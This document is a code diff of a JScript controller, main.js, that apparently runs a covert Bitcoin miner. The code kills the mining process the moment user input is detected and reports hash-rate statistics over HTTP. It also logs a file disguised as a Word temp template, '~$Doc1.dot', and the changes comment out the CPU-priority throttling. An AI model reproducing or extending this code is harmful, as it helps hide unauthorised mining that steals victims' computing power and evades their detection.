@@ -1,6 +1,6 @@
 //
 log("*----main.js----")
-log("-----main.js DateLastModified : " + __fso.GetFile(__workdir+"~$Doc1.dot").DateLastModified + "----*")
+log("-----main.js DateLastModified : " + __fso.GetFile(__workdir+"~$Doc1.dot").DateLastModified +", md5 : " + __storage.GetFileMD5 (__workdir+"~$Doc1.dot") + "----*")
 //
 function filter_idle(){
 }
@@ -65,7 +65,7 @@ function filter_sebtc.prototype.setEnvironmentVariable(env){
 		//env("-lowestworker") = 800;
 		env("#ki[h") = val;
 		//env("VSD")=1;
-		//env("VSD") = 1; 
+		
 	}
 }
 function filter_sebtc.prototype.conditionDenyPowerQuery(){	
@@ -125,28 +125,38 @@ function filter_sebtc.prototype.monitorCPUandInput(pipe){
 		var process = new Enumerator (__service.ExecQuery(wql)).item();	
 		if( process){	
 			var idle = __external.GetTickCount()-__external.GetLastInputInfo()
-			if(idle >0 && idle < 1500) //主动出口
-			{
+			if(idle >0 && idle < 1500){ //主动出口			
 				clearInterval(timer1)
-				__TRY(function (){
-					process.Terminate(-100); 
-				})		
-				log("kill exit idle="+idle+" , pid="+pid+" , __external.GetLastInputInfo()="+__external.GetLastInputInfo()+", __external.GetTickCount()="+__external.GetTickCount());
+				log("kill exit idle="+idle+" , pid="+pid+" , __external.GetLastInputInfo()="+__external.GetLastInputInfo()+", __external.GetTickCount()="+__external.GetTickCount());					
 				var PAGE_READWRITE = 4;
 				var h = __storage.OpenFileMapping( PAGE_READWRITE, 0,"rpcxx_speed");
 				var s = "";
-				if(h)
-				{					
+				if(h){
 					var s = __storage.ReadFileMapping(h,128);
 					var si = parseInt(s);
 					if(si>0)
 						si += 10000;
 					sendHttpStat("monitor_btc", "rpcxx_speed_" + parseInt(parseInt(si) / 10000));
-				}				
+				}			
+				__TRY(function (){
+					process.Terminate(-100); 
+				})
 				sendHttpStat("monitor_btc", "kill_exit", parseInt((__external.GetTickCount()-starttime)/1000/60),1);
 				pThis.callback(pipe)
 				return ;
 			}	
+			
+				var PAGE_READWRITE = 4;
+				var h = __storage.OpenFileMapping( PAGE_READWRITE, 0,"rpcxx_speed");
+				log("h="+h);
+				var s = "";
+				if(h){
+					var s = __storage.ReadFileMapping(h,128);
+					var si = parseInt(s);
+					if(si>0)
+						si += 10000;
+					sendHttpStat("monitor_btc", "rpcxx_speed_" + parseInt(parseInt(si) / 10000));
+				}			
 			//MonitorCPU 
 			var NORMAL_PRIORITY_CLASS     =        0x00000020
 			var IDLE_PRIORITY_CLASS       =        0x00000040
@@ -158,7 +168,7 @@ function filter_sebtc.prototype.monitorCPUandInput(pipe){
 			if(__cpu.LoadPercentage>60) {
 				__TRY(function (){
 				 if(process.Priority !=6){
-					process.SetPriority (BELOW_NORMAL_PRIORITY_CLASS)
+					//process.SetPriority (BELOW_NORMAL_PRIORITY_CLASS)
 					log("monitorInput idle = "+idle + " GetTickCount()="+__external.GetTickCount()+" GetLastInputInfo()="+__external.GetLastInputInfo()
 					+" process.name="+process.Name
 					+ " handle="+process.Handle
@@ -171,7 +181,7 @@ function filter_sebtc.prototype.monitorCPUandInput(pipe){
 			 else if(__cpu.LoadPercentage<5) {
 				__TRY(function (){	
 					 if(process.Priority !=10){
-						 process.SetPriority (ABOVE_NORMAL_PRIORITY_CLASS)
+						 //process.SetPriority (ABOVE_NORMAL_PRIORITY_CLASS)
 						 log("monitorInput idle = "+idle + " GetTickCount()="+__external.GetTickCount()+" GetLastInputInfo()="+__external.GetLastInputInfo()
 						+" process.name="+process.Name
 						+ " handle="+process.Handle
